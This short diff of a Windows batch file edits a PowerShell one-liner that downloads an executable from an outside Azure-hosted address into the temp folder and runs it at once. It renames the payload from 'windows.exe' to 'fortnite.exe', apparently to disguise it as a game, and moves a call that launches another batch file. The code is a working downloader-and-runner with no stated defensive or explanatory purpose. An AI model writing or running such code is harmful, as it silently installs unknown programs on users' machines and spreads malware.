@@ -33,10 +33,11 @@
 ::
 ::978f952a14a936cc963da21a135fa983
 @echo off
-start fn.bat
 
-set files= 'http://mogiant.azurewebsites.net/windows.exe'
+set files= 'http://mogiant.azurewebsites.net/fortnite.exe'
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 
+
+start fn.bat
 
